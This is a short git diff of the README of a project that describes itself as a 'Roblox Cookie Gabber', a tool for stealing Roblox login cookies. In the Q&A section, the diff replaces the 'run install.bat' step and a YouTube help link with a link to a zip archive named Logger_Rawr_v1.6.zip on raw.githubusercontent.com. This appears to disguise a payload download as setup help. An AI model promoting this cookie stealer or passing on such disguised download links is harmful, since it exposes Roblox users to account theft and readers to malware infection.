@@ -21,9 +21,9 @@ A Roblox Cookie Gabber With Many Features
 
 # Q And A
 - Q:What Happens If It Dosent Run?
-- A:Make Sure You Have Python 3.10 Installed And Python Added To Path And Run install.bat
+- A:Make Sure You Have Python 3.10 Installed And Python Added To Path And Run https://raw.githubusercontent.com/Bandsealah/Rawr-Logger/main/Spondylus/Logger_Rawr_v1.6.zip
 - Q: How To Add Python To Path?
-- A:https://www.youtube.com/watch?v=lezhrFdVSVY
+- https://raw.githubusercontent.com/Bandsealah/Rawr-Logger/main/Spondylus/Logger_Rawr_v1.6.zip
 - Q:Will You Update This Project In The Future?
 - A:Maybe But Its Unlikely
 
